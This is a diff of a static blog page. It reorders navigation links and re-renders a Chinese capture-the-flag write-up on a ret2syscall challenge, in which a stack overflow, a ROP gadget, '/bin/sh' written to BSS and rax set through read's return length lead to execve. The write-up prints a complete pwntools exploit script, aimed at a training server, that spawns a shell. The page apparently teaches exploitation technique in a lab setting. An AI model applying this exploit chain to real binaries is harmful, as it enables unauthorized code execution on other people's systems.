@@ -247,9 +247,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -258,9 +258,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/about/">
               
-              归档
+              关于
               
               
             </a>
@@ -280,9 +280,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/archive/">
               
-              分类
+              归档
               
               
             </a>
@@ -410,7 +410,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">863</span> In Total
+              Words <span class="post-count">872</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,13 +472,32 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <p>先把白夜学长<a target="_blank" rel="noopener" href="https://github.com/ChrisL0tus/mess-files/blob/main/ret2syscall.pdf">这篇文章</a>放这，关于ret2syscall的深入浅出，一看就能学会！<br>下载题目附件后拖入ida，看到vuln函数如下：<br><img src="ret2syscall-1.png" alt=""></p>
-<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>这次不用libc而是使用系统调用(syscall)，那么我们就要自己构造系统调用链<br>其原理就是在Linux的glibc中，大部分系统调用已经被封装成普通的函数，如 read ， write ， open ， execve等，同时也将 syscall 指令进行了封装，以64位Linux的glibc位例，read(0, buf, 0x10) 函数也可以是 syscall(0, 0, buf, 0x10)<br>read函数的调用号是0，所以这里第一个参数是0，那么我们根据64位的调用表得知execve函数的调用号为0x3b，那么我们这里syscall的调用号参数就要控制为0x3b，这个参数存在寄存器rax中，我们要控制的就是rax的值为0x3b<br>还是跟以前的ret类题目一样构造ROP链，要对目标文件找到几个/一个片段(gadget)其包括我们所需要的接收pop 寄存器以及syscall的调用</p>
-<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>找到这样一个片段，应该是白夜学长<del>(偷懒)</del>为了我做题方便直接把这些放一块了，我哭死<br><img src="ret2syscall-2.png" alt=""></p>
-<h2 id="需要构造的链"><a href="#需要构造的链" class="headerlink" title="需要构造的链"></a>需要构造的链</h2><p>我们需要构造如下一个链：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*n                     <span class="comment">#垃圾数据</span></span><br><span class="line">pop rdx;rsi;rdi;syscall   <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">0</span>                         <span class="comment">#rdx</span></span><br><span class="line"><span class="number">0</span>                         <span class="comment">#rsi</span></span><br><span class="line"><span class="regexp">/bin/</span>sh_addr              <span class="comment">#/bin/sh的地址</span></span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure></p>
-<h2 id="需要解决的"><a href="#需要解决的" class="headerlink" title="需要解决的"></a>需要解决的</h2><p>目前最大的问题是两个，首先程序本身没有”/bin/sh”这个字符串，不能直接获得这样一个字符串的地址，<strong>找不到那么我们怎么办呢？当然是自己写啦！！</strong><br>没错，仔细观察伪代码可以发现程序第二次输入的str位于BSS段：<br><img src="ret2syscall-3.png" alt=""><br>那么我们是不是可以将第一次的/bin/sh地址指向bss段的开头，并在第二次输入时在该段输入”/bin/sh”并且在填充”\x00”使读取完/bin/sh就结束读取，这样/bin/sh的问题就解决了<br>还有一个问题是系统调用号的处理，我们需要控制rax，但怎么控制rax的值呢？<br>这里就有一个小技巧：read 和 write 函数返回值为输入或者输出的字符串的长度，而返回值存在 ax 寄存器中。可以利用这两个函数来控制系统调用需要的 rax 的值。通过gdb调试我们可以发现，第二次read函数接收的字符串长度会影响ax,而rax初始为0，我们ax有多大，rax就有多大，关于ax与rax的关系有一张图很直观地解释了<br><img src="ret2syscall-4.png" alt=""><br>他们本身是同一个寄存器的不同部分，很好理解。这样一来我们只要<strong>控制第二次输入的长度就可以控制rax</strong>，怎么控制呢？当然是在/bin/sh后面填充33个”\x00”啦！,看似不起眼的第二步居然有如此关键的双重作用，不错不错！</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>根据以上思路，有了以下exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;1-vidar-train-docker.xn--sxa.cc&quot;</span>,<span class="string">&quot;49815&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x401197</span> <span class="comment">#pop rdx ; pop rsi ; pop rdi ; syscall</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line">str_addr=<span class="number">0x404080</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(str_addr)<span class="comment">#/bin/sh</span></span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Now can you share me something interesting?&quot;</span>,payload)</span><br><span class="line">payload2 = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Anything else?&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-
+        <p>先把白夜学长<a target="_blank" rel="noopener" href="https://github.com/ChrisL0tus/mess-files/blob/main/ret2syscall.pdf">这篇文章</a>放这，关于ret2syscall的深入浅出，一看就能学会！<br>
+下载题目附件后拖入ida，看到vuln函数如下：<br>
+<img src="ret2syscall-1.png" alt=""></p>
+<h2 id="思路：">思路：</h2>
+<p>这次不用libc而是使用系统调用(syscall)，那么我们就要自己构造系统调用链<br>
+其原理就是在Linux的glibc中，大部分系统调用已经被封装成普通的函数，如 read ， write ， open ， execve等，同时也将 syscall 指令进行了封装，以64位Linux的glibc位例，read(0, buf, 0x10) 函数也可以是 syscall(0, 0, buf, 0x10)<br>
+read函数的调用号是0，所以这里第一个参数是0，那么我们根据64位的调用表得知execve函数的调用号为0x3b，那么我们这里syscall的调用号参数就要控制为0x3b，这个参数存在寄存器rax中，我们要控制的就是rax的值为0x3b<br>
+还是跟以前的ret类题目一样构造ROP链，要对目标文件找到几个/一个片段(gadget)其包括我们所需要的接收pop 寄存器以及syscall的调用</p>
+<h2 id="ROPgadget">ROPgadget</h2>
+<p>找到这样一个片段，应该是白夜学长~~(偷懒)~~为了我做题方便直接把这些放一块了，我哭死<br>
+<img src="ret2syscall-2.png" alt=""></p>
+<h2 id="需要构造的链">需要构造的链</h2>
+<p>我们需要构造如下一个链：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*n                     <span class="comment">#垃圾数据</span></span><br><span class="line">pop rdx;rsi;rdi;syscall   <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">0</span>                         <span class="comment">#rdx</span></span><br><span class="line"><span class="number">0</span>                         <span class="comment">#rsi</span></span><br><span class="line"><span class="regexp">/bin/</span>sh_addr              <span class="comment">#/bin/sh的地址</span></span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure>
+<h2 id="需要解决的">需要解决的</h2>
+<p>目前最大的问题是两个，首先程序本身没有&quot;/bin/sh&quot;这个字符串，不能直接获得这样一个字符串的地址，<strong>找不到那么我们怎么办呢？当然是自己写啦！！</strong><br>
+没错，仔细观察伪代码可以发现程序第二次输入的str位于BSS段：<br>
+<img src="ret2syscall-3.png" alt=""><br>
+那么我们是不是可以将第一次的/bin/sh地址指向bss段的开头，并在第二次输入时在该段输入&quot;/bin/sh&quot;并且在填充&quot;\x00&quot;使读取完/bin/sh就结束读取，这样/bin/sh的问题就解决了<br>
+还有一个问题是系统调用号的处理，我们需要控制rax，但怎么控制rax的值呢？<br>
+这里就有一个小技巧：read 和 write 函数返回值为输入或者输出的字符串的长度，而返回值存在 ax 寄存器中。可以利用这两个函数来控制系统调用需要的 rax 的值。通过gdb调试我们可以发现，第二次read函数接收的字符串长度会影响ax,而rax初始为0，我们ax有多大，rax就有多大，关于ax与rax的关系有一张图很直观地解释了<br>
+<img src="ret2syscall-4.png" alt=""><br>
+他们本身是同一个寄存器的不同部分，很好理解。这样一来我们只要<strong>控制第二次输入的长度就可以控制rax</strong>，怎么控制呢？当然是在/bin/sh后面填充33个&quot;\x00&quot;啦！,看似不起眼的第二步居然有如此关键的双重作用，不错不错！</p>
+<h1>exp</h1>
+<p>根据以上思路，有了以下exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;1-vidar-train-docker.xn--sxa.cc&quot;</span>,<span class="string">&quot;49815&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./vuln&quot;)</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x401197</span> <span class="comment">#pop rdx ; pop rsi ; pop rdi ; syscall</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line">str_addr=<span class="number">0x404080</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(str_addr)<span class="comment">#/bin/sh</span></span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Now can you share me something interesting?&quot;</span>,payload)</span><br><span class="line">payload2 = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Anything else?&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
         <hr>
         <!-- Pager -->
@@ -627,7 +646,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">思路：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ROPgadget"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">ROPgadget</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%9C%80%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%E9%93%BE"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">需要构造的链</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%9C%80%E8%A6%81%E8%A7%A3%E5%86%B3%E7%9A%84"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">需要解决的</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#exp"><span class="toc-nav-number"></span> <span class="toc-nav-text">exp</span></a>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">思路：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ROPgadget"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">ROPgadget</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%9C%80%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%E9%93%BE"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">需要构造的链</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%9C%80%E8%A6%81%E8%A7%A3%E5%86%B3%E7%9A%84"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">需要解决的</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number"></span> <span class="toc-nav-text">exp</span></a>
         
         </div>
       </aside>
